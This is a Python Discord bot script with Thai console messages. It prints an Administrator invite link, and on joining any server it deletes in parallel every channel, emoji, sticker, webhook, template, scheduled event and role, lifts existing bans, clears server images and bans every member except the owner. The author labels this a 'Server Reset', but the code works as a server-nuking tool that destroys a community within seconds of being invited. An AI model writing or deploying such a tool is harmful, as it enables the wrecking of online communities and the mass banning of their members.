import os
import asyncio
import discord
from dotenv import load_dotenv

# Load token from .env
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

# Setup intents for bot
intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print("=" * 60)
    print(f"Logged in as: {client.user} (ID: {client.user.id})")
    
    # Generate bot invite link with Administrator permission
    invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
    print("=" * 60)
    print(f"INVITE LINK (ลิ้งเชิญบอท):")
    print(invite_link)
    print("=" * 60)
    print("บอทเริ่มทำงานและสแตนด์บายแล้ว (โหมดความเร็วสูง - Parallel Reset)...")
    print("เมื่อเชิญบอทเข้าเซิฟเวอร์ใดๆ บอทจะทำการลบและแบนพร้อมกันทันที!")
    print("=" * 60)

@client.event
async def on_guild_join(guild):
    print(f"\n[+] บอทเข้าร่วมเซิฟเวอร์ใหม่: {guild.name} (ID: {guild.id})")
    print("[+] เริ่มดึงข้อมูลเซิฟเวอร์แบบขนานเพื่อความรวดเร็ว...")
    
    bot_member = guild.me
    owner = guild.owner
    if not owner:
        try:
            guild = await client.fetch_guild(guild.id)
            owner = guild.owner
        except Exception as e:
            print(f"[!] ไม่สามารถดึงข้อมูลเจ้าของเซิฟเวอร์ได้: {e}")

    # Helper functions to fetch data concurrently
    async def fetch_webhooks():
        try:
            return await guild.webhooks()
        except Exception as e:
            print(f"  x ดึงข้อมูลเว็บฮุคล้มเหลว: {e}")
            return []

    async def fetch_templates():
        try:
            return await guild.templates()
        except Exception as e:
            print(f"  x ดึงข้อมูลเทมเพลตล้มเหลว: {e}")
            return []

    async def fetch_channels():
        try:
            return await guild.fetch_channels()
        except Exception as e:
            print(f"  x ดึงข้อมูลช่องล้มเหลว (ใช้ข้อมูลแคชแทน): {e}")
            return guild.channels

    async def fetch_bans():
        bans_list = []
        try:
            async for ban_entry in guild.bans():
                bans_list.append(ban_entry.user)
        except Exception as e:
            print(f"  x ดึงข้อมูลรายชื่อแบนล้มเหลว: {e}")
        return bans_list

    async def fetch_members():
        members_list = []
        try:
            async for member in guild.fetch_members(limit=None):
                members_list.append(member)
        except Exception as e:
            print(f"  x ดึงข้อมูลสมาชิกล้มเหลว (ใช้ข้อมูลแคชแทน): {e}")
            members_list = guild.members
        return members_list

    # Run all fetch operations concurrently
    channels, webhooks, templates, bans, members = await asyncio.gather(
        fetch_channels(),
        fetch_webhooks(),
        fetch_templates(),
        fetch_bans(),
        fetch_members()
    )

    print(f"[+] ดึงข้อมูลเสร็จสิ้น! ช่อง: {len(channels)}, สมาชิก: {len(members)}, ยศ: {len(guild.roles)}")
    print("[-] กำลังดำเนินการลบและแบนทั้งหมดแบบขนาน (Concurrent Clearing)...")

    # Helper print function to avoid Windows cp874/cp1252 encoding crashes on emojis/unicode symbols
    def safe_print(message):
        try:
            print(message)
        except UnicodeEncodeError:
            try:
                # Fallback to ascii representation or replace unencodable chars
                print(message.encode('ascii', errors='backslashreplace').decode('ascii'))
            except Exception:
                pass

    tasks = []

    # 1. Channel deletion tasks
    async def delete_channel(c):
        try:
            await c.delete()
            safe_print(f"  - ลบช่องสำเร็จ: {c.name} ({c.type})")
        except Exception as e:
            safe_print(f"  x ลบช่องไม่สำเร็จ: {c.name} | {e}")

    for c in list(channels):
        tasks.append(delete_channel(c))

    # 2. Emoji deletion tasks
    async def delete_emoji(e):
        try:
            await e.delete()
            safe_print(f"  - ลบอิโมจิสำเร็จ: {e.name}")
        except Exception as err:
            safe_print(f"  x ลบอิโมจิไม่สำเร็จ: {e.name} | {err}")

    for e in list(guild.emojis):
        tasks.append(delete_emoji(e))

    # 3. Sticker deletion tasks
    async def delete_sticker(s):
        try:
            await s.delete()
            safe_print(f"  - ลบสติกเกอร์สำเร็จ: {s.name}")
        except Exception as err:
            safe_print(f"  x ลบสติกเกอร์ไม่สำเร็จ: {s.name} | {err}")

    for s in list(guild.stickers):
        tasks.append(delete_sticker(s))

    # 4. Webhook deletion tasks
    async def delete_webhook(w):
        try:
            await w.delete()
            safe_print(f"  - ลบเว็บฮุคสำเร็จ: {w.name}")
        except Exception as err:
            safe_print(f"  x ลบเว็บฮุคไม่สำเร็จ: {w.name} | {err}")

    for w in webhooks:
        tasks.append(delete_webhook(w))

    # 5. Template deletion tasks
    async def delete_template(t):
        try:
            await t.delete()
            safe_print(f"  - ลบเทมเพลตสำเร็จ: {t.code}")
        except Exception as err:
            safe_print(f"  x ลบเทมเพลตไม่สำเร็จ: {t.code} | {err}")

    for t in templates:
        tasks.append(delete_template(t))

    # 6. Event deletion tasks
    async def delete_event(ev):
        try:
            await ev.delete()
            safe_print(f"  - ลบกิจกรรมสำเร็จ: {ev.name}")
        except Exception as err:
            safe_print(f"  x ลบกิจกรรมไม่สำเร็จ: {ev.name} | {err}")

    for ev in list(guild.scheduled_events):
        tasks.append(delete_event(ev))

    # 7. Unban tasks
    async def unban_user(u):
        try:
            await guild.unban(u)
            safe_print(f"  - ปลดแบนสำเร็จ: {u.name}")
        except Exception as err:
            safe_print(f"  x ปลดแบนไม่สำเร็จ: {u.name} | {err}")

    for u in bans:
        tasks.append(unban_user(u))

    # 8. Role deletion tasks
    async def delete_role(r):
        if r.is_default() or r.managed:
            return
        try:
            await r.delete()
            safe_print(f"  - ลบยศสำเร็จ: {r.name}")
        except Exception as err:
            safe_print(f"  x ลบยศไม่สำเร็จ: {r.name} | {err}")

    for r in list(guild.roles):
        tasks.append(delete_role(r))

    # 9. Ban member tasks
    async def ban_member(m):
        if m.id == bot_member.id:
            return
        if owner and m.id == owner.id:
            return
        try:
            await m.ban(reason="Server Reset by Bot")
            safe_print(f"  - แบนสมาชิกสำเร็จ: {m.name} (ID: {m.id})")
        except Exception as err:
            safe_print(f"  x แบนสมาชิกไม่สำเร็จ: {m.name} | {err}")

    for m in members:
        tasks.append(ban_member(m))

    # 10. Guild Media resetting task
    async def reset_media():
        try:
            await guild.edit(icon=None, banner=None, splash=None)
            safe_print("  - ลบรูปภาพตกแต่งเซิฟเวอร์ทั้งหมดสำเร็จ")
        except Exception as err:
            safe_print(f"  x ไม่สามารถลบรูปภาพตกแต่งเซิฟเวอร์ได้: {err}")

    tasks.append(reset_media())

    # Execute all tasks concurrently!
    safe_print(f"[-] ยื่นคำขอลบ/แบนขนานกันทั้งหมด {len(tasks)} รายการ...")
    await asyncio.gather(*tasks)

    safe_print(f"\n[+] เสร็จสิ้นกระบวนการเคลียร์/รีเซ็ตเซิฟเวอร์ {guild.name} แบบความเร็วสูง!")
    print("=" * 60)

if __name__ == "__main__":
    if not TOKEN:
        print("Error: ไม่พบ DISCORD_TOKEN ในไฟล์ .env")
    else:
        client.run(TOKEN)
